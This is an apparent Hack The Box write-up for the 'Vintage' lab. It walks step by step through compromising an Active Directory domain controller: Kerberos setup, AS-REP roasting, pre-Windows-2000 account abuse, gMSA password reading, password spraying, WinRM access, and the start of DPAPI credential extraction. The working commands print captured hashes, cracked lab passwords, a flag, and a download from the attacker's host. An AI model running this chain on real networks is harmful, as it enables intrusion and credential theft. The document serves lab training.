# Vintage

## Recon

::: details nmap_scan.log
```log
Open 10.10.11.45:389
Open 10.10.11.45:445
Open 10.10.11.45:464
Open 10.10.11.45:593
Open 10.10.11.45:3268
Open 10.10.11.45:3269
Open 10.10.11.45:53
Open 10.10.11.45:88
Open 10.10.11.45:139
Open 10.10.11.45:135
Open 10.10.11.45:5985
Open 10.10.11.45:9389
Open 10.10.11.45:49674
Open 10.10.11.45:49685
Open 10.10.11.45:49206
Open 10.10.11.45:49668
Open 10.10.11.45:49664
Open 10.10.11.45:65514
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.10.11.45

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-01-24 16:42:30Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49206/tcp open  msrpc         syn-ack Microsoft Windows RPC
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc         syn-ack Microsoft Windows RPC
65514/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-24T16:43:24
|_  start_date: N/A
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 53397/tcp): CLEAN (Timeout)
|   Check 2 (port 23689/tcp): CLEAN (Timeout)
|   Check 3 (port 61163/udp): CLEAN (Timeout)
|   Check 4 (port 17262/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```
:::

::: info :information_source: Machine Information
As is common in real life Windows pentests, you will start the Vintage box with credentials for the following account: **P.Rosa / Rosaisbest123**
:::

::: tip :bulb: Creds
`P.Rosa:Rosaisbest123`
:::

## SMB

Even tho we have credentials we are not able to enumerate SMB. STATUS_NOT_SUPPORTED means NTLM authentication is disabled, but we should be able to use Kerberos (which also doesn't work)
```bash
└─$ netexec smb vintage.htb -u 'P.Rosa' -p 'Rosaisbest123'
SMB         10.10.11.45     445    10.10.11.45      [*]  x64 (name:10.10.11.45) (domain:10.10.11.45) (signing:True) (SMBv1:False)
SMB         10.10.11.45     445    10.10.11.45      [-] 10.10.11.45\P.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED

└─$ netexec smb vintage.htb -u 'P.Rosa' -p 'Rosaisbest123' -k
SMB         vintage.htb     445    vintage          [*]  x64 (name:vintage) (domain:htb) (signing:True) (SMBv1:False)
SMB         vintage.htb     445    vintage          [-] htb\P.Rosa:Rosaisbest123 [Errno Connection error (HTB:88)] [Errno -2] Name or service not known
```

```bash
# https://gist.github.com/zhsh9/f1ba951ec1eb3de401707bbbec407b98
└─$ curl -LOs https://gist.githubusercontent.com/zhsh9/f1ba951ec1eb3de401707bbbec407b98/raw/5a1ecf615cd687926138622c69c618a52466c812/configure_krb5.py
└─$ py configure_krb5.py vintage.htb dc01
[*] This script must be run as root
[*] Configuration Data:
[libdefault]
        default_realm = VINTAGE.HTB

[realms]
        VINTAGE.HTB = {
                kdc = dc01.vintage.htb
                admin_server = dc01.vintage.htb
        }

[domain_realm]
        vintage.htb = VINTAGE.HTB
        .vintage.htb = VINTAGE.HTB


[!] Above Configuration will overwrite /etc/krb5.conf, are you sure? [y/N] y
[+] /etc/krb5.conf has been configured
└─$ kinit P.Rosa@vintage.htb
kinit: Cannot find KDC for realm "vintage.htb" while getting initial credentials
```

Still not able to `kinit` 

Trace show that there's problem with DNS, we could try disabling it. 
```bash
└─$ KRB5_TRACE=/dev/stderr kinit P.Rosa@vintage.htb
[559452] 1737816321.118466: Getting initial credentials for P.Rosa@vintage.htb
[559452] 1737816321.118467: Error loading plugin module pkinit: 2/unable to load plugin [/usr/lib/x86_64-linux-gnu/krb5/plugins/preauth/pkinit.so]: /usr/lib/x86_64-linux-gnu/krb5/plugins/preauth/pkinit.so: cannot open shared object file: No such file or directory
[559452] 1737816321.118469: Sending unauthenticated request
[559452] 1737816321.118470: Sending request (184 bytes) to vintage.htb
[559452] 1737816321.118471: Sending DNS URI query for _kerberos.vintage.htb.
[559452] 1737816326.299580: No URI records found
[559452] 1737816326.299581: Sending DNS SRV query for _kerberos._udp.vintage.htb.
[559452] 1737816331.362555: Sending DNS SRV query for _kerberos._tcp.vintage.htb.
[559452] 1737816336.431654: No SRV records found
[559452] 1737816336.431655: Retrying AS request with primary KDC
[559452] 1737816336.431656: Getting initial credentials for P.Rosa@vintage.htb
[559452] 1737816336.431658: Sending unauthenticated request
[559452] 1737816336.431659: Sending request (184 bytes) to vintage.htb (primary)
[559452] 1737816336.431660: Sending DNS URI query for _kerberos.vintage.htb.
[559452] 1737816341.494194: No URI records found
[559452] 1737816341.494195: Sending DNS SRV query for _kerberos-master._udp.vintage.htb.
[559452] 1737816346.558853: Sending DNS SRV query for _kerberos-master._tcp.vintage.htb.
[559452] 1737816351.618464: No SRV records found
kinit: Cannot find KDC for realm "vintage.htb" while getting initial credentials
```

Kerberos is case sensitive as it turns out..................
```bash
└─$ kinit P.Rosa@VINTAGE.HTB
Password for P.Rosa@VINTAGE.HTB:

└─$ klist
Ticket cache: FILE:/tmp/krb5cc_1001
Default principal: P.Rosa@VINTAGE.HTB

Valid starting       Expires              Service principal
01/25/2025 10:14:49  01/25/2025 20:14:49  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 01/26/2025 10:14:37
```

```bash
└─$ netexec smb dc01.vintage.htb --timeout 99 -u 'P.Rosa' -p 'Rosaisbest123' --shares -k
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\P.Rosa:Rosaisbest123
SMB         dc01.vintage.htb 445    dc01             [*] Enumerated shares
SMB         dc01.vintage.htb 445    dc01             Share           Permissions     Remark
SMB         dc01.vintage.htb 445    dc01             -----           -----------     ------
SMB         dc01.vintage.htb 445    dc01             ADMIN$                          Remote Admin
SMB         dc01.vintage.htb 445    dc01             C$                              Default share
SMB         dc01.vintage.htb 445    dc01             IPC$            READ            Remote IPC
SMB         dc01.vintage.htb 445    dc01             NETLOGON        READ            Logon server share
SMB         dc01.vintage.htb 445    dc01             SYSVOL          READ            Logon server share
```

```bash
└─$ netexec smb dc01.vintage.htb --timeout 99 -u 'P.Rosa' -p 'Rosaisbest123' -k --rid-brute | tee rid-brute.log
└─$ grep 'User' rid-brute.log | awk '{print($6)}' | tee users.txt
VINTAGE\Administrator
VINTAGE\Guest
VINTAGE\krbtgt
VINTAGE\Domain
VINTAGE\Protected
VINTAGE\DC01$
VINTAGE\gMSA01$
VINTAGE\FS01$
VINTAGE\M.Rossi
VINTAGE\R.Verdi
VINTAGE\L.Bianchi
VINTAGE\G.Viola
VINTAGE\C.Neri
VINTAGE\P.Rosa
VINTAGE\svc_sql
VINTAGE\svc_ldap
VINTAGE\svc_ark
VINTAGE\C.Neri_adm
VINTAGE\L.Bianchi_adm
```

## Kerberoasting

### asreproast

```bash
└─$ netexec ldap dc01.vintage.htb --timeout 99 -u users.txt -p '' -k --asreproast output.txt
LDAP        dc01.vintage.htb 389    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
LDAP        dc01.vintage.htb 389    dc01.vintage.htb $krb5asrep$23$svc_ldap@VINTAGE.HTB:13151a28039f13c3e7ca3231571573b1$7e6d78401edfc15f4e6f6d52fff8067e4f75524917962c7479238102fa49ad44816dbad86705574f048fc99fac17c5ae93097b7e0b7f19081bff25eae787dd86b671764c489e90f4f3a2c0bdcb64f033f73c4bd3a44874a14e9761e7c600f8a5e34f50b01ed97e92c222d941628f30c8477edb9f3f7fd76d59d758b65a195808b3b225c9e36769acfc860e5e327a3d85141db5d8e260b11bdafe7c010674a4b3c1ebe80bb0c3d041c61912d9e27f39d776b7f1e065a45463a34cc191d16f72a8a6036a92935bfe871735e040b9814d7b6ce13ad3a53cbe0a840386a5ce95a929d6e76cf65a39687fa7a3
LDAP        dc01.vintage.htb 389    dc01.vintage.htb $krb5asrep$23$svc_ark@VINTAGE.HTB:b7475329116b1f837f865ffd324d9147$f6e5c5fa05b31e904903097947bb13a823c619268acf1fb52eb67ba35ed6ec2e7f9f5b69324961baa10861e6e1fe2deeb9a35b331565d1bf4bb21f38c11fc3784130201c931844697f591b8f341294afc9e467f9428fdf90f4576060bd5a4a51d5c870f1bb784845428d12d4f4bd69405396819ef54c9129acf0b6c1a1d02b2ce5f18921182614486e34a6f93ac4ab3b1b3d0dcbca032e6d326ed0042a77a9e4ca18547e3eec05432a9878dd07db544123f5230712b9a5ac825b4de81f740d7b669a645f17e3b58da38042442cf8a4039157bf72b7990e75ce3069eb55c49bf2c69fe0905e8df3c4001d
```

No luck with cracking the hash
```bash
└─$ hashcat -a 0 -m 18200 ./hashes.txt $rockyou
Status...........: Exhausted
```

### NoPreAuth

We can try NoPreAuth kerberoasting 

[https://www.thehacker.recipes/ad/movement/kerberos/kerberoast#kerberoast-w-o-pre-authentication](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast#kerberoast-w-o-pre-authentication)

```bash
└─$ impacket-GetUserSPNs -no-preauth "P.Rosa" -usersfile "users.txt" -dc-host "10.10.11.45" "VINTAGE.HTB/"
...Nothing
```

### Pre2k

Gather bloodhound data:
```bash
bloodhound-python -d vintage.htb -u 'P.Rosa' -ns 10.10.11.45 -c all --dns-timeout 100 --zip -op P.Rosa -p 'Rosaisbest123'
```

The FS01 computer is part of Domain Computers who has permission of ReadGMSAPassword, target feels like first privilege escalation target.

![Writeup.png](/assets/pentest/htb/vintage/Writeup.png)

![Writeup-1.png](/assets/pentest/htb/vintage/Writeup-1.png)

[Pre2k](https://github.com/garrettfoster13/pre2k) is a tool to query for the existence of pre-windows 2000 computer objects which can be leveraged to gain a foothold in a target domain as discovered by [TrustedSec's](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/) [@Oddvarmoe](https://twitter.com/Oddvarmoe).

```bash
└─$ pipx install git+https://github.com/garrettfoster13/pre2k.git
└─$ cat users.txt | awk -F'\\' '{print($2)}' > users2.txt # Remove Domain
└─$ pre2k unauth -d vintage.htb -dc-ip 10.10.11.45 -inputfile users2.txt -save
[18:54:17] INFO     Testing started at 2025-02-16 18:54:17
[18:54:17] INFO     Using 10 threads
[18:54:17] INFO     VALID CREDENTIALS: vintage.htb\FS01$:fs01
[18:54:17] INFO     Saving ticket in FS01$.ccache
```

## ReadGMSAPassword

```bash
└─$ export KRB5CCNAME=$(readlink -f ./FS01\$.ccache)
```

[https://www.netexec.wiki/ldap-protocol/dump-gmsa](https://www.netexec.wiki/ldap-protocol/dump-gmsa) fails because LDAP**S** is not enabled

[https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword)

```bash
└─$ bloodyAD --host "dc01.vintage.htb" --dc-ip "10.10.11.45" -d "vintage.htb" -k get object 'GMSA01$' --attr msDS-ManagedPassword
distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:cfa9f6edd15de88ae7a9652114e3f4a7
msDS-ManagedPassword.B64ENCODED: G37YR+Xo7NkIU4nkCJrl8cWrcPKAzCKH7UZW+eHVzKQ+Ot45XZFdv2KMUOSLUf6AVA57yBkDSRoDf/ItCOPL9BbrKex2E54WOk5Qov+ORM/Cvou23tZdNvvZMXLelTihuYtq/Lj2Pjr+9W1Oe1NOyNfytvcbMVk1czTOurzxsH3IRgDKJ8wVhijXMx79dqrug7RVOlhwcvxPbcYoYKoXmNGIWdgbIRfNTQ6QjKNfypvGh3AOtK3ETIq07AKPM4Qnuu2IRDWyAveGp1KU3nS4t+HP5XEdkqj22/AuqAOkhXXdU7PkVeK92wR/6LUuXiFoYqnZz527rHvfx/zKiHHdjA==
```

## Service Managers

### AddSelf

![Writeup-2.png](/assets/pentest/htb/vintage/Writeup-2.png)

![Writeup-3.png](/assets/pentest/htb/vintage/Writeup-3.png)

```bash
└─$ export KRB5CCNAME=$(readlink -f ./GMSA01\$.ccache)
└─$ bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" --dc-ip 10.10.11.45 -k add groupMember "ServiceManagers" "GMSA01$"
[+] GMSA01$ added to ServiceManagers
```

or
```bash
└─$ powerview 'vintage.htb'/'GMSA01$'@'dc01.vintage.htb' -H ':cfa9f6edd15de88ae7a9652114e3f4a7' -k
PV > Add-DomainGroupMember -Identity ServiceManagers -Members GMSA01$
[2025-02-16 19:18:17] User GMSA01$ successfully added to ServiceManagers
```

### GenericAll

Shadow Credentials failed again because of LDAP**S**
```bash
└─$ certipy-ad shadow auto -u 'GMSA01$@vintage.htb' -hashes ':cfa9f6edd15de88ae7a9652114e3f4a7' -account svc_ark -target dc01.vintage.htb -dc-ip 10.10.11.45 -k
[-] Got error: socket ssl wrapping error: [Errno 104] Connection reset by peer
```

Get information about svc accounts:
```bash
└─$ powerview 'vintage.htb'/'GMSA01$'@'dc01.vintage.htb' -H ':cfa9f6edd15de88ae7a9652114e3f4a7' -k
(LDAP)-[dc01.vintage.htb]-[VINTAGE\gMSA01$]
PV > Get-DomainUser svc_sql
cn                                : svc_sql
distinguishedName                 : CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
memberOf                          : CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
name                              : svc_sql
objectGUID                        : {3fb41501-6742-4258-bfbe-602c3a8aa543}
userAccountControl                : ACCOUNTDISABLE [4260354]
                                    NORMAL_ACCOUNT
                                    DONT_EXPIRE_PASSWORD
badPwdCount                       : 0
badPasswordTime                   : 06/07/2024
lastLogoff                        : 0
lastLogon                         : 02/16/2025
pwdLastSet                        : 02/17/2025
primaryGroupID                    : 513
objectSid                         : S-1-5-21-4024337825-2033394866-2055507597-1134
sAMAccountName                    : svc_sql
sAMAccountType                    : 805306368
objectCategory                    : CN=Person,CN=Schema,CN=Configuration,DC=vintage,DC=htb
msDS-SupportedEncryptionTypes     :

(LDAP)-[dc01.vintage.htb]-[VINTAGE\gMSA01$]
PV > Get-DomainUser svc_ldap
cn                                : svc_ldap
distinguishedName                 : CN=svc_ldap,OU=Pre-Migration,DC=vintage,DC=htb
memberOf                          : CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
name                              : svc_ldap
objectGUID                        : {3b90b174-1c8b-4d97-9455-caadb41c2b30}
userAccountControl                : NORMAL_ACCOUNT [4260352]
                                    DONT_EXPIRE_PASSWORD
badPwdCount                       : 0
badPasswordTime                   : 06/07/2024
lastLogoff                        : 0
lastLogon                         : 02/16/2025
pwdLastSet                        : 06/06/2024
primaryGroupID                    : 513
objectSid                         : S-1-5-21-4024337825-2033394866-2055507597-1135
sAMAccountName                    : svc_ldap
sAMAccountType                    : 805306368
objectCategory                    : CN=Person,CN=Schema,CN=Configuration,DC=vintage,DC=htb
msDS-SupportedEncryptionTypes     :

(LDAP)-[dc01.vintage.htb]-[VINTAGE\gMSA01$]
PV > Get-DomainUser svc_ark
cn                                : svc_ark
distinguishedName                 : CN=svc_ark,OU=Pre-Migration,DC=vintage,DC=htb
memberOf                          : CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
name                              : svc_ark
objectGUID                        : {c992370c-b510-4ff5-b3bf-eeb716183845}
userAccountControl                : NORMAL_ACCOUNT [4260352]
                                    DONT_EXPIRE_PASSWORD
badPwdCount                       : 0
badPasswordTime                   : 06/07/2024
lastLogoff                        : 0
lastLogon                         : 02/16/2025
pwdLastSet                        : 06/06/2024
primaryGroupID                    : 513
objectSid                         : S-1-5-21-4024337825-2033394866-2055507597-1136
sAMAccountName                    : svc_ark
sAMAccountType                    : 805306368
objectCategory                    : CN=Person,CN=Schema,CN=Configuration,DC=vintage,DC=htb
msDS-SupportedEncryptionTypes     :
```

### asreproast (2)

Activate SVC_SQL account and enable NoPreAuth for kerberoasting. Because I don't want to change password and shadow credentials is failing because of LDAPS.
```bash
bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE
bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB --dc-ip 10.10.11.45 -k add uac SVC_SQL -f DONT_REQ_PREAUTH
bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB --dc-ip 10.10.11.45 -k add uac SVC_ARK -f DONT_REQ_PREAUTH
bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB --dc-ip 10.10.11.45 -k add uac SVC_LDAP -f DONT_REQ_PREAUTH
```

```bash
└─$ netexec ldap dc01.vintage.htb --timeout 99 -u users.txt -p '' -k --asreproast output.txt
LDAP        dc01.vintage.htb 389    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
LDAP        dc01.vintage.htb 389    dc01.vintage.htb $krb5asrep$23$svc_sql@VINTAGE.HTB:dc3dd1120dc953ee6e5205fc250cf8bc$dcd3da7c080d44aa6e1aef4af366ff37d6d89173a2fb3ffc32a4fa6d8803d4642e2e779875d35bb8b1d6b54853768830bad77d126017156b1e5f5bc4c30df1d39b68f45a0638a7b68c6841dc29c9c8edbdae50f455f41344030f4041870f45d8f8fa820dee6776f795c0332a0c743140c4ec6e8e146c2bab440cd187317a14294f84754e6ebf2a62070cc56e061a439b2824ef9c3534fe24bd549f8a57503c2491cbec198583f2a6322e89d921931bccef2c9384b100a7816efde31844383ad99c3905992f8d7670ee08c9b0d452cea1af90fe8e4885489f4285c8370123c961f840f3fafddb037afa66
LDAP        dc01.vintage.htb 389    dc01.vintage.htb $krb5asrep$23$svc_ldap@VINTAGE.HTB:4b84a0668ca817cb942329d759942de0$c6a5ca9eb74d611d98350e76786509c59d093f80235b8e72fc8694c639ef419b1870274abc203537c712194fa3bafb58c2125edbccc11a6be4ab289607c1debb749cf2cb0e79b59c3ce0a9228515b6f7b4e792b30c62c5862ffa1962dde0c9ae7c9c13d5831b6639cde7033b9826d51caa605c6121aee8b8a1185d6109a69995b2200db4af0b9567802855768496dbda42b1841a5feec31afd666e85ac441ea2df1abcdf84fb1fa4774a5f94fff2890f3b892ad1135faea68685ce265fd87fdb7a7ea142610afb866423af921ef22fdb1270ed6e2f0b7d0b2bca7c7451059d91d7c035e83e80ff0ea0b8
LDAP        dc01.vintage.htb 389    dc01.vintage.htb $krb5asrep$23$svc_ark@VINTAGE.HTB:7291c0c85516fb8ac2003fb4823a0b19$2c701f70448d3b233875d20114b45d3129081703f30a05f088c3dabaaa6db69d0b0f94e26ba66d08d9de13bcc5d1cca26cf13c0e64c0f88fe6ab08be73c340a098ef1d8966c3219711a42d7c5223dd438f9b1fe3f82abdc5c62bdc123a75c21d563cdcb726531ad6d4068823c4b388543f3e43a57d1d7b51ef02a8312eed865743943ec373f880ef0eff2d5aa6a9003de4997b677c454e6c6b7d0111e669fe3ddd5543765693ff5daa3a625dc59c0538444101321be5a5d509f58e88704b5671e7eedc990574270d2c14c71be54b9b6fa2f4d29764cd7ea30d69bfe31ab6dd6e751b27368273c105b218
```

`svc_sql` account was previously not found, let's try to crack it.

```bash
└─$ hashcat -a 0 -m 18200 ./hashes.txt $rockyou
$krb5asrep$23$svc_sql@VINTAGE.HTB:dc3dd1120...3fafddb037afa66:Zer0the0ne
```

### Password Spray

`netexec` fails with kerberos and without `-k` flag it doesn't output anything.
```bash
└─$ netexec smb "dc01.vintage.htb" -u users.txt -p "Zer0the0ne" -k --continue-on-success
SMB         dc01.vintage.htb 445    dc01             [-] VINTAGE\Protected:Zer0the0ne KDC_ERR_C_PRINCIPAL_UNKNOWN
SMB         dc01.vintage.htb 445    dc01             [-] VINTAGE\C.Neri:Zer0the0ne STATUS_MORE_PROCESSING_REQUIRED
SMB         dc01.vintage.htb 445    dc01             [-] VINTAGE\P.Rosa:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         dc01.vintage.htb 445    dc01             [-] VINTAGE\svc_sql:Zer0the0ne KDC_ERR_CLIENT_REVOKED
SMB         dc01.vintage.htb 445    dc01             [+] VINTAGE\svc_ldap account vulnerable to asreproast attack
SMB         dc01.vintage.htb 445    dc01             [+] VINTAGE\svc_ark account vulnerable to asreproast attack
```

Instead we can utilize `kerbrute`
```bash
└─$ kerbrute passwordspray users2.txt 'Zer0the0ne' -d vintage.htb --dc dc01.vintage.htb
2025/02/16 20:44:07 >  [+] VALID LOGIN:  C.Neri@vintage.htb:Zer0the0ne
```

## WinRM

This user is also part of ServiceManagers which was not seen before.

![Writeup-4.png](/assets/pentest/htb/vintage/Writeup-4.png)

Since this user is part of Remote Management we can winrm into the machine.

```bash
└─$ evil-winrm -i 'dc01.vintage.htb' -u 'C.Neri' -p 'Zer0the0ne'
Error: An error of type ArgumentError happened, message is unknown type: 2061232681
```

Auth with kerberos
```bash
└─$ impacket-getTGT -dc-ip 'dc01.vintage.htb' 'vintage.htb'/'C.Neri':'Zer0the0ne' -k
[*] Saving ticket in C.Neri.ccache

└─$ export KRB5CCNAME=$(readlink -f ./C.Neri.ccache)
└─$ evil-winrm -i 'dc01.vintage.htb' -r 'vintage.htb'
*Evil-WinRM* PS C:\Users\C.Neri\Documents> whoami /all

User Name      SID
============== ==============================================
vintage\c.neri S-1-5-21-4024337825-2033394866-2055507597-1115

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
VINTAGE\ServiceManagers                     Group            S-1-5-21-4024337825-2033394866-2055507597-1137 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

::: info :information_source: Note
For `realm` to work you need to configure `/etc/krb5.conf` which we did at the start
:::

### User.txt

```
*Evil-WinRM* PS C:\Users\C.Neri\Documents> cat ../Desktop/user.txt
a36a948bf014439b5bd454ac74a4bd75
```

## Privilege Escalation (c.neri_adm)

Domain has normal users and then `_adm` prefix users, C.Neri also has this user.
```bash
*Evil-WinRM* PS C:\Users\C.Neri\Documents> net user
Administrator            C.Neri                   C.Neri_adm
G.Viola                  Guest                    krbtgt
L.Bianchi                L.Bianchi_adm            M.Rossi
P.Rosa                   R.Verdi                  svc_ark
svc_ldap                 svc_sql
```

AV is active and doesn't permit running winpeas, not even `winPEASx64_ofs.exe` version.
```bash
*Evil-WinRM* PS C:\Users\C.Neri\Music> curl.exe 10.10.14.130/wp.exe -O
*Evil-WinRM* PS C:\Users\C.Neri\Music> .\wp.exe | tee -filepath wp.log
Program 'wp.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
```

We can't disable the service, so manual enumeration go...
[Checklist - Local Windows Privilege Escalation > Windows Credentials](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html#windows-credentials)

### DPAPI

One common attack vector is DPAPI.

[https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi)
[https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html)

```powershell
*Evil-WinRM* PS C:\Users\C.Neri\Documents> ls "$ENV:USERPROFILE\AppData\Roaming\Microsoft\Protect\" -ErrorAction Silent -Recurse -Force -File | %{$_.FullName}
C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\CREDHIST
C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\SYNCHIST
C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\BK-VINTAGE
C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\Preferred
*Evil-WinRM* PS C:\Users\C.Neri\Documents> ls "$ENV:USERPROFILE\AppData\Local\Microsoft\Protect\" -ErrorAction Silent -Recurse -Force -File | %{$_.FullName}

*Evil-WinRM* PS C:\Users\C.Neri\Documents> ls "$ENV:USERPROFILE\AppData\Local\Microsoft\Credentials" -ErrorAction Silent -Recurse -Force -File | %{$_.FullName}
C:\Users\C.Neri\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
```

We can't upload mimikatz on box so we have to attack caches locally. To download them first we need to unhide the files, because Windows has a weird flex where hidden files cannot be accessed.
```bash
*Evil-WinRM* PS C:\Users\C.Neri\Documents> attrib "C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847"
A  SH                C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
```

```bash
attrib -H -S "C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847"
attrib -H -S "C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b"
attrib -H -S "C:\Users\C.Neri\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D"

download "C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847"
download "C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b"
download "C:\Users\C.Neri\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D"
```

Get masterkeys
```bash
└─$ impacket-dpapi masterkey -file ./4dbf04d8-529b-4b4c-b4ae-8e875e4fe847 -password Zer0the0ne -sid S-1-5-21-4024337825-2033394866-2055507597-1115 | grep 'key:'
Decrypted key: 0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f

